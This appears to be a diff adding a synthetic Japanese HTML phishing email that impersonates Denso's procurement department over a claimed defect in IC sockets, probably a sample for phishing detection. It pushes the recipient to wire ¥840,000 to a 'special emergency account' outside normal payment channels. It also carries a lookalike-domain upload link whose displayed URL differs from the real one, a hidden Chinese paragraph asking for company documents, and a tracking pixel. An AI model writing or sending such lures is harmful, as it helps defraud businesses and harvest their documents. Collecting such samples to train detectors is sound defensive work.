@@ -1,0 +1,99 @@
+From: デンソー株式会社 調達部 <procurement.emergency@denso-jpn-supplier.example>
+To: purchase@corp.internal
+Cc: quality@corp.internal, logistics@corp.internal
+Reply-To: emergency.procurement@denso-expedite.example
+Date: Fri, 23 Oct 2026 15:00:00 +0900
+Disposition-Notification-To: procurement.emergency@denso-jpn-supplier.example
+Message-ID: <0696-b57@synth.example>
+Subject: =?utf-8?B?44OG44Kz44OJ44OQ44O844Kr44Oz44OE44Oq44K544Oz44OJ44KkJzHml6XmnJ8l?=
+ =?utf-8?B?44Gu562J44Gj44Gf44GE44Gf44Gh44KM44Gm44GE44Gf44Gf44GE44KL44Gv?=
+ =?utf-8?B?44Gq44KK5oCs6YCA44GX44Gm5LiL6Kmg44GV44KM44Gg44Gh44KP44GL44GU?=
+ =?utf-8?B?44GW44GE44Gf44GZ44Go44GG44GO44GX44Gf44GE44KL?=
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:sans-serif">
+<p>調達部各位</p>
+
+<p>貴社供給の精密ICソケット（部品番号：SOCK-QFN48-A）について、当社第三製造部（安城工場）の生産ラインが<b>全面停止</b>しております。緊急対応のため、下記の通りご対応をお願いいたします。</p>
+
+<h3>一、不具合概要</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:150px">発生日時</td><td>2026-10-23 06:00 JST</td></tr>
+<tr><td style="background:#f5f5f5">発生場所</td><td>デンソー第三製造部 安城工場 ライン3</td></tr>
+<tr><td style="background:#f5f5f5">対象部品</td><td>精密ICソケット SOCK-QFN48-A（QFN48パッケージ用）</td></tr>
+<tr><td style="background:#f5f5f5">不具合内容</td><td style="color:#e00"><b>端子接触不良（量産ロットで発見）</b></td></tr>
+<tr><td style="background:#f5f5f5">影響ロット</td><td>2026-W40～W42（3週分、14ロット）</td></tr>
+<tr><td style="background:#f5f5f5">不良率</td><td>0.8%（規格: <0.01%）</td></tr>
+<tr><td style="background:#f5f5f5">影響数量</td><td>約28,000pcs（組み込み済み含む）</td></tr>
+<tr><td style="background:#f5f5f5">生産影響</td><td style="color:#e00"><b>ライン3全面停止（完成車メーカー3社に影響）</b></td></tr>
+<tr><td style="background:#f5f5f5">停止損失</td><td>約<b>￥4,200万/日</b>（営業損失ベース）</td></tr>
+</table>
+
+<h3>二、原因分析（暫定）</h3>
+<p>当社分析の結果、貴社製ソケットの<b>端子めっき厚のばらつき</b>が原因と判明：</p>
+<ul>
+<li>規格：Ni 2μm + Au 0.38μm（±10%）</li>
+<li>実測：Ni 1.2-2.8μm / Au 0.12-0.55μm（大幅なばらつき）</li>
+<li>原因推定：W40-W42期間のめっき液管理不備</li>
+</ul>
+
+<h3>三、緊急対応要請</h3>
+
+<p><b>対応1：代替品の緊急出荷（本日中）</b></p>
+<p>良品ロット（W39以前）から<b>10,000pcs</b>を<b>本日航空便</b>で出荷してください：</p>
+<div style="background:#fff3cd;padding:16px;border-radius:4px;border:2px solid #e00">
+<p style="color:#e00"><b>⚠ 緊急輸送費用は以下の口座へお振込みください ⚠</b></p>
+<p>当社の通常の調達決済口座は本件の緊急輸送には使用できません（決済承認に3-5営業日かかるため）。<b>緊急対応専用口座</b>へのお振込みにて、即日の航空手配が可能となります：</p>
+<p style="font-size:15px;line-height:1.8">
+<b>振込先：</b>デンソーエクスプレス（株）緊急調達専用口座<br>
+<b>銀行：</b>三菱UFJ銀行 名古屋中央支店<br>
+<b>口座番号：</b>0039-4471-8842<br>
+<b>SWIFT：</b>TSTBJPJT<br>
+<b>金額：</b>￥840,000（航空運賃+通関料+緊急手数料）<br>
+<b>備考：</b>EMERGENCY-SOCK-QFN48-W40
+</p>
+</div>
+
+<p><b>対応2：是正報告書の提出（10/25まで）</b></p>
+<p>下記内容を含む是正報告書（8D形式）を提出してください。報告書は<b>当社サプライヤーポータル</b>からアップロードしてください：</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://denso-jpn-supplier.example/portal/supplier/8d/upload?case=QN-2026-0991" style="display:inline-block;background:#c7000b;color:#fff;padding:10px 30px;text-decoration:none;border-radius:4px">是正報告書のアップロード</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://supplier.denso.com/portal/8d-report</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需紧急技术支持（中文），请在 denso-jpn-supplier.example/urgent-cn 上传公司营业执照与产品规格书，我司中国区代表将直接联系（4小时内响应）。</p>
+
+<h3>四、今後の対応</h3>
+<ol>
+<li><b>本日中：</b>代替品10,000pcsの緊急出荷（航空便）</li>
+<li><b>10/25：</b>是正報告書（8D）の提出</li>
+<li><b>10/28：</b>当社品質監査チームが貴社工場を訪問（立会い検査）</li>
+<li><b>11/01：</b>当社の生産再開判定</li>
+<li><b>11/15：</b>不具合コストの分担協議</li>
+</ol>
+
+<h3>五、コスト分担について</h3>
+<p>本件の総損失（生産停止損失+代替品費用+顧客対応費用）は<b>暫定￥12,600万</b>と試算されており、サプライヤー品質保証契約（SQA-2025-088）第7条に基づき、貴社への分担請求額は<b>￥7,560万</b>（60%）となる見込みです。詳細は11/15の協議で確定します。</p>
+
+<h3>六、緊急連絡先</h3>
+<p>日本語・英語での緊急連絡は以下まで：</p>
+<ul>
+<li>調達部 緊急対応デスク：<b>+81-566-25-****</b>（24時間）</li>
+<li>中国語での緊急連絡は<b>専用ライン +86-571-8765-9910</b>（日本の夜間も対応）</li>
+<li>メール：<b>emergency.procurement@denso-expedite.example</b>（緊急専用）</li>
+</ul>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">デンソー株式会社 | 調達部 サプライヤー品質グループ</p>
+<p style="font-size:11px;color:#999">愛知県安城市箕輪町1-1</p>
+<p style="font-size:11px;color:#999">本メールは機密情報を含みます。誤って受け取られた場合は削除してください。</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://denso-jpn-supplier.example/api/track?recipient=purchase%40corp.internal&case=QN-2026-0991&type=line_stoppage" width="1" height="1" alt="">
+</div>
+
+</body></html>
